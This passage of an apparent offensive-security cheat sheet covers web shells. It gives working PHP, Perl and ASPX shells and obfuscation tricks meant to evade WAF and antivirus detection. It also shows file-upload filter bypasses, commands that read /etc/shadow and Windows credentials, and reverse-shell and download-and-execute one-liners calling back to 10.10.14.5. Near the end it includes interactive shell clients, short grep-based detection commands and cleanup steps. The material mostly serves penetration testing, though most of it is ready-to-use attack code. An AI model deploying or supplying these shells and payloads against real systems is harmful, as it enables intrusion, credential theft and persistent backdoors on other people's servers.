<%= process.mainModule.require('child_process').execSync('id').toString() %>
```

```javascript [Pug SSTI]
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('id').toString()}()}
```

---

### Perl CGI Web Shell

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Perl" color="green"}
  :badge{label="CGI" color="blue"}
  :badge{label="Legacy" color="orange"}
  :badge{label="cPanel" color="red"}
::

![Perl](https://img.shields.io/badge/Perl-39457E?style=for-the-badge&logo=perl&logoColor=white)

```perl [shell.pl — Perl CGI web shell]
#!/usr/bin/perl
use strict;
use CGI;

my $q = CGI->new;
my $cmd = $q->param('cmd');

print $q->header('text/html');
print "<html><body>";

if ($cmd) {
    my $output = `$cmd 2>&1`;
    print "<pre>" . CGI::escapeHTML($output) . "</pre>";
}

print '<form method="GET">';
print '<input name="cmd" size="60" placeholder="id">';
print '<input type="submit" value="Execute">';
print '</form></body></html>';
```

```bash [Deploy and access]
cp shell.pl /var/www/cgi-bin/
chmod +x /var/www/cgi-bin/shell.pl
curl "http://target.com/cgi-bin/shell.pl?cmd=id"
```

---

## :icon{name="i-lucide-eye-off"} Obfuscation & Evasion

### Why Obfuscate?

Web Application Firewalls (WAFs), antivirus software, and file integrity monitoring systems actively scan for known web shell patterns. Obfuscation transforms shell code to **bypass detection** while maintaining functionality.

Common detection triggers:
- Function names: `system`, `exec`, `shell_exec`, `passthru`, `eval`
- Strings: `cmd`, `command`, `shell`, `hack`
- PHP tags combined with execution functions
- Known web shell signatures (hash-based detection)

### PHP Obfuscation Techniques

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Obfuscation" color="neutral"}
  :badge{label="PHP" color="green"}
  :badge{label="WAF Bypass" color="blue"}
  :badge{label="AV Evasion" color="orange"}
  :badge{label="Encoding" color="red"}
  :badge{label="Dynamic Calls" color="purple"}
::

::tabs
  :::tabs-item{icon="i-lucide-eye-off" label="String Manipulation"}
  ```php [Variable function — Dynamic function name]
  <?php
  $f = 'sys' . 'tem';
  $f($_GET['cmd']);
  ?>
  ```

  ```php [str_rot13 — Rotate characters]
  <?php
  $f = str_rot13('flfgrz');  // 'system' ROT13'd
  $f($_GET['cmd']);
  ?>
  ```

  ```php [strrev — Reverse string]
  <?php
  $f = strrev('metsys');  // 'system' reversed
  $f($_GET['cmd']);
  ?>
  ```

  ```php [chr() — Character codes]
  <?php
  // s=115, y=121, s=115, t=116, e=101, m=109
  $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
  $f($_GET['cmd']);
  ?>
  ```

  ```php [Hex string — \x escape]
  <?php
  $f = "\x73\x79\x73\x74\x65\x6d";  // 'system' in hex
  $f($_GET['cmd']);
  ?>
  ```

  ```php [Combined — Multiple layers]
  <?php
  $a = 'sys';
  $b = 'tem';
  $c = $a . $b;
  $d = str_rot13('pzq');  // 'cmd' ROT13'd
  $c($_GET[$d]);
  ?>
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Base64 / Encoding"}
  ```php [Base64 encoded function]
  <?php
  $f = base64_decode('c3lzdGVt');  // 'system'
  $f($_GET['cmd']);
  ?>
  ```

  ```php [Base64 encoded entire shell]
  <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
  ```

  ```php [Gzip compressed]
  <?php eval(gzinflate(base64_decode('...'))); ?>
  ```

  ```php [URL encoded eval]
  <?php $x = urldecode('%73%79%73%74%65%6d'); $x($_GET['cmd']); ?>
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Variable Variables"}
  ```php [Double dollar — Variable variable]
  <?php
  $a = '_GET';
  $b = 'cmd';
  $c = 'system';
  $c($$a[$b]);
  ?>
  ```

  ```php [Array-based obfuscation]
  <?php
  $arr = array('sy','st','em');
  $f = implode('', $arr);
  $f($_REQUEST['x']);
  ?>
  ```

  ```php [create_function — Anonymous function]
  <?php
  $f = create_function('$x', 'system($x);');
  $f($_GET['cmd']);
  ?>
  ```

  ```php [Callback — array_map / array_filter]
  <?php
  // Using assert (PHP < 8.0)
  assert($_GET['cmd']);

  // Using array_map
  array_map('system', array($_GET['cmd']));

  // Using array_filter
  array_filter(array($_GET['cmd']), 'system');

  // Using usort
  usort($_GET, 'system');

  // Using preg_replace with /e modifier (PHP < 7.0)
  preg_replace('/.*/e', 'system("$_GET[cmd]")', '');
  ?>
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Hidden in Files"}
  ```php [Hidden in image — GIF header bypass]
  GIF89a
  <?php system($_GET['cmd']); ?>
  ```

  ```php [Hidden in EXIF data]
  // Inject PHP into JPEG EXIF comment:
  // exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
  // Rename: mv image.jpg image.php.jpg
  ```

  ```php [Hidden in .htaccess]
  # .htaccess — make .jpg files execute as PHP
  AddType application/x-httpd-php .jpg

  # Then upload shell as shell.jpg
  ```

  ```php [PHP short tags]
  <?=`$_GET[cmd]`?>
  ```

  ```php [PHP without php tag — phtml extension]
  <!-- Save as shell.phtml -->
  <script language="php">system($_GET['cmd']);</script>
  ```
  :::
::

---

### ASPX Obfuscation

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Obfuscation" color="neutral"}
  :badge{label="ASPX" color="blue"}
  :badge{label="C#" color="green"}
  :badge{label="Reflection" color="orange"}
::

::code-collapse

```aspx [Reflection-based — Dynamic method invocation]
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<%
if (Request["cmd"] != null) {
    Type t = Type.GetType("System.Diagnostics.Process");
    MethodInfo m = t.GetMethod("Start", new Type[]{typeof(string), typeof(string)});
    object p = m.Invoke(null, new object[]{"cmd.exe", "/c " + Request["cmd"]});

    PropertyInfo pi = p.GetType().GetProperty("StandardOutput");
    // Read output via reflection...
}
%>
```

```aspx [Compile at runtime]
<%@ Page Language="C#" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<%
string code = @"
using System;
using System.Diagnostics;
public class R {
    public static string E(string c) {
        var p = Process.Start(new ProcessStartInfo(""cmd.exe"",""/c ""+c){UseShellExecute=false,RedirectStandardOutput=true});
        return p.StandardOutput.ReadToEnd();
    }
}";
var provider = new CSharpCodeProvider();
var cp = new CompilerParameters();
cp.ReferencedAssemblies.Add("System.dll");
var cr = provider.CompileAssemblyFromSource(cp, code);
var type = cr.CompiledAssembly.GetType("R");
if (Request["cmd"] != null)
    Response.Write("<pre>" + type.GetMethod("E").Invoke(null, new[]{Request["cmd"]}) + "</pre>");
%>
```

::

---

## :icon{name="i-lucide-upload"} Upload Bypass Techniques

### File Upload Filter Bypass

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Upload Bypass" color="neutral"}
  :badge{label="Extension" color="green"}
  :badge{label="Content-Type" color="blue"}
  :badge{label="Magic Bytes" color="orange"}
  :badge{label="WAF" color="red"}
  :badge{label="Filter Evasion" color="purple"}
::

![Upload Bypass](https://img.shields.io/badge/Upload_Bypass-E74C3C?style=for-the-badge)

File upload functionality often validates uploads through multiple checks — file extensions, MIME types, magic bytes, and content analysis. These techniques bypass each validation layer.

::tabs
  :::tabs-item{icon="i-lucide-file" label="Extension Bypass"}

  Different web servers process various extensions as the same language. If `.php` is blocked, try alternative extensions.

  ```bash [PHP Alternative Extensions]
  shell.php           # Standard
  shell.php3          # PHP 3
  shell.php4          # PHP 4
  shell.php5          # PHP 5
  shell.php7          # PHP 7
  shell.pht           # PHP (alternative)
  shell.phtml         # PHP HTML
  shell.phar          # PHP Archive
  shell.phps          # PHP Source (sometimes executed)
  shell.pgif          # PHP (rare)
  shell.shtml         # Server-Side Includes
  shell.inc           # PHP include (if misconfigured)
  shell.module        # PHP module
  ```

  ```bash [ASP/ASPX Alternative Extensions]
  shell.asp            # Classic ASP
  shell.aspx           # ASP.NET
  shell.ashx           # ASP.NET HTTP Handler
  shell.asmx           # ASP.NET Web Service
  shell.ascx           # ASP.NET User Control
  shell.soap           # SOAP endpoint
  shell.config         # .NET config (sometimes interpreted)
  shell.cer            # Certificate (sometimes executed as ASP)
  shell.asa            # ASP Application
  shell.cdx            # Active Channel Definition
  ```

  ```bash [JSP Alternative Extensions]
  shell.jsp            # Standard JSP
  shell.jspx           # XML-based JSP
  shell.jsw            # JSP wrapper
  shell.jsv            # JSP variant
  shell.jspf           # JSP fragment
  ```

  ```bash [Double Extensions / Null Bytes]
  shell.php.jpg        # Double extension
  shell.php.png        # Double extension
  shell.php%00.jpg     # Null byte injection (PHP < 5.3.4)
  shell.php\x00.jpg    # Null byte (URL encoded)
  shell.php%0a.jpg     # Newline injection
  shell.php;.jpg       # Semicolon (IIS specific)
  shell.php::$DATA     # NTFS ADS (Windows/IIS)
  shell.php%20         # Trailing space
  shell.php.           # Trailing dot (Windows)
  ```

  ```bash [Case Variations]
  shell.pHp
  shell.PhP
  shell.PHP
  shell.pHP
  shell.Php
  ```
  :::

  :::tabs-item{icon="i-lucide-file-type" label="Content-Type Bypass"}

  If the server validates the `Content-Type` header, change it to an allowed MIME type while keeping the PHP content.

  ```bash [Intercept and modify Content-Type]
  # Allowed MIME types to use:
  Content-Type: image/jpeg
  Content-Type: image/png
  Content-Type: image/gif
  Content-Type: application/pdf
  Content-Type: text/plain
  Content-Type: application/octet-stream
  ```

  ```bash [curl with fake Content-Type]
  # Upload PHP shell with image Content-Type
  curl -X POST "http://target.com/upload" \
    -F "file=@shell.php;type=image/jpeg;filename=shell.php"
  ```

  ```python [Python requests with fake Content-Type]
  import requests

  files = {
      'file': ('shell.php', open('shell.php', 'rb'), 'image/jpeg')
  }
  r = requests.post('http://target.com/upload', files=files)
  print(r.text)
  ```
  :::

  :::tabs-item{icon="i-lucide-binary" label="Magic Bytes / Headers"}

  Add valid file **magic bytes** (file signatures) to the beginning of your shell to bypass content-based validation that checks the first few bytes of a file.

  ```php [GIF89a header — Most common bypass]
  GIF89a
  <?php system($_GET['cmd']); ?>
  ```

  ```php [PNG header bytes]
  PNG<?php system($_GET['cmd']); ?>
  ```

  ```bash [Add JPEG header with Python]
  python3 -c "import sys; sys.stdout.buffer.write(b'\xff\xd8\xff\xe0')" > shell.php.jpg
  cat actual_shell.php >> shell.php.jpg
  ```

  ```bash [Inject PHP into real image EXIF]
  # Add PHP code to EXIF comment field
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg

  # If server processes EXIF with include():
  # LFI → include('uploads/photo.jpg') → code executes
  ```

  ```php [PDF header]
  %PDF-1.4
  <?php system($_GET['cmd']); ?>
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="Server Config Bypass"}

  Abuse server configuration files to change how file extensions are processed.

  ```apache [.htaccess — Make .jpg execute as PHP (Apache)]
  AddType application/x-httpd-php .jpg .png .gif
  ```

  ```apache [.htaccess — Enable PHP in specific directory]
  <FilesMatch "\.(jpg|png|gif)$">
      SetHandler application/x-httpd-php
  </FilesMatch>
  ```

  ```apache [.htaccess — Force PHP handler]
  AddHandler php-script .txt
  ```

  ```xml [web.config — IIS handler mapping]
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers>
        <add name="PHPasJPG" path="*.jpg" verb="*" modules="CgiModule"
             scriptProcessor="C:\PHP\php-cgi.exe" resourceType="Unspecified" />
      </handlers>
    </system.webServer>
  </configuration>
  ```
  :::
::

::warning
Always test upload bypass techniques in your **specific target environment**. Different web server versions, PHP configurations, and security modules will block different bypass methods. Try multiple approaches.
::

---

## :icon{name="i-lucide-terminal"} Web Shell Usage & Post-Deployment

### Essential Commands After Deployment

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Post-Deploy" color="neutral"}
  :badge{label="Enumeration" color="green"}
  :badge{label="Situational Awareness" color="blue"}
  :badge{label="First Commands" color="orange"}
::

After successfully deploying a web shell, run these commands to understand your environment.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux"}
  ```bash [Identity & System]
  curl "http://target.com/shell.php?cmd=id"
  curl "http://target.com/shell.php?cmd=whoami"
  curl "http://target.com/shell.php?cmd=hostname"
  curl "http://target.com/shell.php?cmd=uname+-a"
  curl "http://target.com/shell.php?cmd=cat+/etc/os-release"
  ```

  ```bash [Network]
  curl "http://target.com/shell.php?cmd=ip+a"
  curl "http://target.com/shell.php?cmd=ss+-tulnp"
  curl "http://target.com/shell.php?cmd=cat+/etc/hosts"
  ```

  ```bash [Files & Credentials]
  curl "http://target.com/shell.php?cmd=cat+/etc/passwd"
  curl "http://target.com/shell.php?cmd=cat+/etc/shadow"
  curl "http://target.com/shell.php?cmd=find+/+-name+*.conf+-type+f+2>/dev/null"
  curl "http://target.com/shell.php?cmd=find+/+-name+.env+2>/dev/null"
  curl "http://target.com/shell.php?cmd=ls+-la+/home/"
  ```

  ```bash [Privilege Escalation Enum]
  curl "http://target.com/shell.php?cmd=sudo+-l"
  curl "http://target.com/shell.php?cmd=find+/+-perm+-4000+-type+f+2>/dev/null"
  curl "http://target.com/shell.php?cmd=cat+/etc/crontab"
  curl "http://target.com/shell.php?cmd=getcap+-r+/+2>/dev/null"
  ```
  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows"}
  ```powershell [Identity & System]
  curl "http://target.com/shell.aspx?cmd=whoami"
  curl "http://target.com/shell.aspx?cmd=whoami+/priv"
  curl "http://target.com/shell.aspx?cmd=whoami+/groups"
  curl "http://target.com/shell.aspx?cmd=hostname"
  curl "http://target.com/shell.aspx?cmd=systeminfo"
  ```

  ```powershell [Network]
  curl "http://target.com/shell.aspx?cmd=ipconfig+/all"
  curl "http://target.com/shell.aspx?cmd=netstat+-ano"
  ```

  ```powershell [Credentials]
  curl "http://target.com/shell.aspx?cmd=cmdkey+/list"
  curl "http://target.com/shell.aspx?cmd=type+C:\Windows\Panther\unattend.xml"
  curl "http://target.com/shell.aspx?cmd=reg+query+HKLM\SOFTWARE\Microsoft\Windows+NT\CurrentVersion\Winlogon"
  ```
  :::
::

---

### Upgrade to Reverse Shell

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Upgrade" color="neutral"}
  :badge{label="Web Shell → Reverse Shell" color="green"}
  :badge{label="Interactive Access" color="blue"}
  :badge{label="Essential Step" color="orange"}
::

Web shells are limited to **one command at a time**. Upgrade to a reverse shell for interactive access, tab completion, and running tools like `linpeas` or `mimikatz`.

```bash [Linux — Bash reverse shell via web shell]
# URL-encode the reverse shell command
curl "http://target.com/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'"
```

```bash [Linux — Python reverse shell via web shell]
curl "http://target.com/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

```bash [Linux — Netcat mkfifo via web shell]
curl "http://target.com/shell.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|bash+-i+2>%261|nc+10.10.14.5+4444+>/tmp/f"
```

```bash [Linux — Download and execute]
curl "http://target.com/shell.php?cmd=curl+http://10.10.14.5/shell.elf+-o+/tmp/shell+%26%26+chmod+%2bx+/tmp/shell+%26%26+/tmp/shell"
```

```powershell [Windows — PowerShell reverse shell via web shell]
curl "http://target.com/shell.aspx?cmd=powershell+-nop+-ep+bypass+-c+\"$c=New-Object+Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))+-ne+0){$d=(New-Object+Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex+$d+2>%261|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length);$s.Flush()};$c.Close()\""
```

```powershell [Windows — Download nc.exe and connect back]
:: Step 1: Download netcat
curl "http://target.com/shell.aspx?cmd=certutil+-urlcache+-split+-f+http://10.10.14.5/nc.exe+C:\Windows\Temp\nc.exe"

:: Step 2: Execute reverse shell
curl "http://target.com/shell.aspx?cmd=C:\Windows\Temp\nc.exe+10.10.14.5+4444+-e+cmd.exe"
```

---

### Automated Web Shell Clients

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Client" color="neutral"}
  :badge{label="Automation" color="green"}
  :badge{label="Scripted" color="blue"}
  :badge{label="Interactive" color="orange"}
::

Instead of manually crafting curl commands, use scripts that provide an **interactive terminal experience** through your web shell.

::code-collapse

```bash [Bash — Interactive web shell client]
#!/bin/bash
# Usage: ./webclient.sh http://target.com/shell.php

URL="$1"
PARAM="${2:-cmd}"

if [ -z "$URL" ]; then
    echo "Usage: $0 <url> [param_name]"
    echo "Example: $0 http://target.com/shell.php cmd"
    exit 1
fi

while true; do
    echo -n "webshell> "
    read -r cmd
    [ "$cmd" = "exit" ] && break
    [ -z "$cmd" ] && continue
    curl -s "${URL}?${PARAM}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$cmd'))")" 2>/dev/null
    echo ""
done
```

```python [Python — Feature-rich web shell client]
#!/usr/bin/env python3
"""Interactive web shell client with history and colors"""
import requests
import sys
import readline
import urllib.parse

class WebShellClient:
    def __init__(self, url, param='cmd', method='GET'):
        self.url = url
        self.param = param
        self.method = method
        self.session = requests.Session()
        self.session.verify = False

    def execute(self, command):
        try:
            if self.method.upper() == 'GET':
                r = self.session.get(self.url, params={self.param: command}, timeout=30)
            else:
                r = self.session.post(self.url, data={self.param: command}, timeout=30)
            return r.text
        except Exception as e:
            return f"Error: {e}"

    def interactive(self):
        print(f"[*] Connected to {self.url}")
        print(f"[*] Parameter: {self.param} | Method: {self.method}")
        print("[*] Type 'exit' to quit\n")

        # Get initial info
        print(self.execute('id; hostname; pwd'))

        while True:
            try:
                cmd = input('\033[91mwebshell\033[0m> ')
                if cmd.strip() == 'exit':
                    break
                if not cmd.strip():
                    continue
                output = self.execute(cmd)
                print(output)
            except KeyboardInterrupt:
                print("\n[!] Use 'exit' to quit")
            except EOFError:
                break

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url> [param] [method]")
        print(f"Example: {sys.argv[0]} http://target.com/shell.php cmd GET")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'cmd'
    method = sys.argv[3] if len(sys.argv) > 3 else 'GET'

    client = WebShellClient(url, param, method)
    client.interactive()
```

::

---

## :icon{name="i-lucide-shield-check"} Detection & Cleanup

### Finding Web Shells

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Detection" color="neutral"}
  :badge{label="Blue Team" color="blue"}
  :badge{label="File Integrity" color="green"}
  :badge{label="Forensics" color="orange"}
::

If you're performing security assessments, knowing how defenders find web shells helps you understand the **detection risk** of each technique.

```bash [Linux — Find recently modified PHP files]
find /var/www/ -name "*.php" -mtime -7 -type f
find /var/www/ -name "*.php" -newer /var/www/html/index.php
find /var/www/ -name "*.php" -exec grep -l "system\|exec\|shell_exec\|passthru\|eval\|base64_decode" {} \;
```

```bash [Linux — Find suspicious files by content]
grep -rn "system\|exec\|passthru\|shell_exec\|eval\|base64_decode\|str_rot13\|gzinflate" /var/www/ --include="*.php"
grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE" /var/www/ --include="*.php" | grep -i "exec\|system\|eval"
```

```powershell [Windows — Find recently modified files in IIS]
Get-ChildItem C:\inetpub\wwwroot -Recurse -Include *.aspx,*.asp,*.php -File | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)}
Select-String -Path C:\inetpub\wwwroot\*.aspx -Pattern "Process.Start|cmd.exe|powershell|eval"
```

---

### Cleanup After Testing

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Cleanup" color="neutral"}
  :badge{label="Post-Engagement" color="green"}
  :badge{label="Remove Artifacts" color="blue"}
  :badge{label="Responsible" color="orange"}
::

::warning
**Always remove web shells** after testing. Leaving web shells on production systems creates a backdoor that **anyone** could discover and exploit — potentially causing more damage than your original test.
::

```bash [Linux cleanup]
# Remove uploaded shells
rm -f /var/www/html/shell.php
rm -f /var/www/html/cmd.php
rm -f /var/www/uploads/*.php

# Remove uploaded tools
rm -f /tmp/linpeas.sh /tmp/nc /tmp/socat

# Check for any .htaccess modifications
find /var/www/ -name ".htaccess" -newer /var/www/html/index.html

# Verify removal
find /var/www/ -name "*.php" -mtime -1
```

```powershell [Windows cleanup]
:: Remove uploaded shells
del C:\inetpub\wwwroot\shell.aspx
del C:\inetpub\wwwroot\cmd.asp
del C:\Windows\Temp\nc.exe

:: Check for lingering files
Get-ChildItem C:\inetpub\wwwroot -Recurse -Include *.aspx,*.asp -File | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}
```

---

## :icon{name="i-lucide-shield-alert"} Detection Risk Matrix

| Shell Type | Detection Risk | Detection Method |
| ---------- | -------------- | ---------------- |
| `<?php system($_GET['cmd']); ?>` | :badge{label="HIGH" color="red"} | Pattern matching, signature |
| Base64 encoded shells | :badge{label="MEDIUM" color="orange"} | `base64_decode` + `eval` pattern |
| str_rot13 / strrev obfuscation | :badge{label="MEDIUM" color="orange"} | Heuristic analysis |
| Variable function calls | :badge{label="LOW" color="green"} | Dynamic analysis only |
| Hidden in image EXIF | :badge{label="LOW" color="green"} | Deep content inspection |
| Header/Cookie-based shells | :badge{label="LOW" color="green"} | Runtime behavior analysis |
| Full-featured shells (b374k, WSO) | :badge{label="VERY HIGH" color="red"} | Hash-based signatures |
| .htaccess manipulation | :badge{label="LOW" color="green"} | File integrity monitoring |

---

## :icon{name="i-lucide-book-open"} References

::card-group
  ::card
  ---
  title: Kali Web Shells
  icon: i-lucide-terminal
  to: https://www.kali.org/tools/webshells/
  target: _blank
  ---
  Pre-installed web shells in Kali Linux at `/usr/share/webshells/` — PHP, ASP, ASPX, JSP, Perl, CFM.
  ::

  ::card
  ---
  title: Web Shell Collection
  icon: i-simple-icons-github
  to: https://github.com/tennc/webshell
  target: _blank
  ---
  10K+ ⭐ — Massive collection of web shells in every server-side language.
  ::

  ::card
  ---
  title: p0wny-shell
  icon: i-simple-icons-github
  to: https://github.com/flozz/p0wny-shell
  target: _blank
  ---
  Single-file PHP web shell with interactive terminal — clean and minimal.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — Upload Bypass
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  target: _blank
  ---
  Comprehensive file upload bypass techniques — extensions, magic bytes, content-type.
  ::

  ::card
  ---
  title: HackTricks — File Upload
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html
  target: _blank
  ---
  File upload exploitation techniques and web shell deployment strategies.
  ::

  ::card
  ---
  title: WhiteWinterWolf PHP Shell
  icon: i-simple-icons-github
  to: https://github.com/WhiteWinterWolf/wwwolf-php-webshell
  target: _blank
  ---
  Feature-rich PHP web shell with file manager and self-destruct capability.
  ::

  ::card
  ---
  title: b374k Shell
  icon: i-simple-icons-github
  to: https://github.com/b374k/b374k
  target: _blank
  ---
  Full-featured password-protected PHP shell with file manager, reverse connect, and database client.
  ::

  ::card
  ---
  title: OWASP — Unrestricted File Upload
  icon: i-lucide-shield-check
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP reference for unrestricted file upload vulnerabilities and mitigations.
  ::
::